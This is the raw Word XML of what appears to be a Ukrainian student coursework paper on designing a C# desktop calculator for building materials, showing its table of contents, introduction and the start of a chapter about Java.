              </w:rPr>
              <w:t>2 ПРОЕКТУВАННЯ КАЛЬКУЛЯТОР ДЛЯ Обчислення КІЛЬКОСТІ НЕОБХІДНІХ МАТЕРІАЛІВ</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_Toc10727432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28</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3" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>2.1 Backlog</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_Toc10727433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28</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4" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>2.2 Розробка UML діаграм</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_Toc10727434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28</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727435" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>2.2.1 Use-Case</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_Toc10727435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29</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727436" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:bCs/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>2.2.2 діаграма класів</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_Toc10727436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31</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="3"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727437" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="uk-UA"/>
              </w:rPr>
              <w:t>2.2.3 Діаграма послідовності</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_Toc10727437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32</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8" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:t>2.3 Розробка форм інтерфейсу і опис процесу роботи з додатком</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_Toc10727438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34</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="11"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
              <w:noProof/>
              <w:sz w:val="28"/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727439" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="uk-UA"/>
              </w:rPr>
              <w:t>ВИСНОВКИ</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_Toc10727439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37</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
          <w:pPr>
            <w:pStyle w:val="11"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9345"/>
            </w:tabs>
            <w:spacing w:line="360" w:lineRule="auto"/>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
              <w:noProof/>
              <w:lang w:val="en-US"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc10727440" w:history="1">
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rStyle w:val="a4"/>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:sz w:val="28"/>
                <w:lang w:val="uk-UA"/>
              </w:rPr>
              <w:t>ЛІТЕРАТУРА</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_Toc10727440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38</w:t>
            </w:r>
            <w:r w:rsidRPr="0060216E">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:noProof/>
                <w:webHidden/>
                <w:sz w:val="28"/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00F33D0A">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00853AAF">
      <w:pPr>
        <w:keepNext/>
        <w:pageBreakBefore/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc10727422"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ВСТУП</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pP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 xml:space="preserve">Потоки інформації, що циркулюють в світі, який нас оточує, величезні. Згодом вони мають тенденцію до збільшення. У будь-якій компанії, як великий, так і малий, виникає проблема підрахунків будівельного матеріалу. В сучасних умовах однією з найбільш поширених завдань, що виникає при внутрішнього облицювання квартири, є розрахунок необхідного матеріалу. Особливо актуальною проблема організації завдань і справ виникає в компаніях, де потрібно ефективно </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>распреділілісь</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> роботу, прискорити, спростити процес підбору матеріалу. Тому створення додатка, який би допомагав будівельникам в таких умовах працювати найбільш ефективно надзвичайно доцільним.</w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:tab/>
      </w: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 xml:space="preserve">Метою даної роботи є створення </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>десктопного</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> додатка, розрахованого на обчислення будівельного матеріалу під розміри кімнат.</w:t>
      </w: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Програмні додатки можна реалізовувати на різних мовах програмування. Однією з таких є об'єктно-орієнтована мова програмування C #.</w:t>
      </w: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 xml:space="preserve">Мета роботи полягає в розширенні, закріпленні і систематизації знань з дисципліни, що вивчається, шляхом проектування і розробки програмного забезпечення, а саме </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>десктопного</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> додатка для обчислення кількості необхідних матеріалів для виконання конкретної роботи в сфері будівництва, облаштування квартир новобудови.</w:t>
      </w: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 xml:space="preserve">Додаток розробляється для персональних комп'ютерів під операційною системою Windows. Середовище розробки </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Visual</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Studio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2019, мова програмування C #.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="00DD2596" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc10727423"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ГЛАВА 1 ОСНОВНЫЕ О ЯЗЫКЕ JAVA. ОСОБЕННОСТИ, ПЛЮСЫ И МИНУСЫ</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRDefault="005E2C4B" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00853AAF" w:rsidRDefault="005E2C4B" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc10727424"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1.1</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Осн</w:t>
      </w:r>
      <w:r w:rsidRPr="006D07EF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ов</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>н</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>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аспекти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bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRPr="00853AAF" w:rsidRDefault="005E2C4B" w:rsidP="00853AAF">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:bCs/>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сильно типизированный </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:tooltip="Объектно-ориентированный язык программирования" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>объектно-ориентированный язык программирования</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, разработанный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"https://ru.wikipedia.org/wiki/Sun_Microsystems" \o "Sun Microsystems"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Sun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Microsystems</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(в последующем приобретённой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"https://ru.wikipedia.org/wiki/Oracle" \o "Oracle"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Oracle</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xml:space="preserve">). Приложения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xml:space="preserve"> обычно </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:tooltip="Транслятор" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>транслируются</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> в специальный </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:tooltip="Байт-код" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>байт-код</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, поэтому они могут работать на любой компьютерной архитектуре с помощью </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:tooltip="Java Virtual Machine" w:history="1">
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t xml:space="preserve">виртуальной </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>Java</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="005E2C4B">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>-машины</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="005E2C4B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve">. Дата официального выпуска — 23 мая 1995 года. На 2018 год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один из самых популярных языков программирования.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="005E2C4B" w:rsidP="00853AAF">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Изначально язык назывался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(«Дуб»), разрабатывался Джеймсом </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
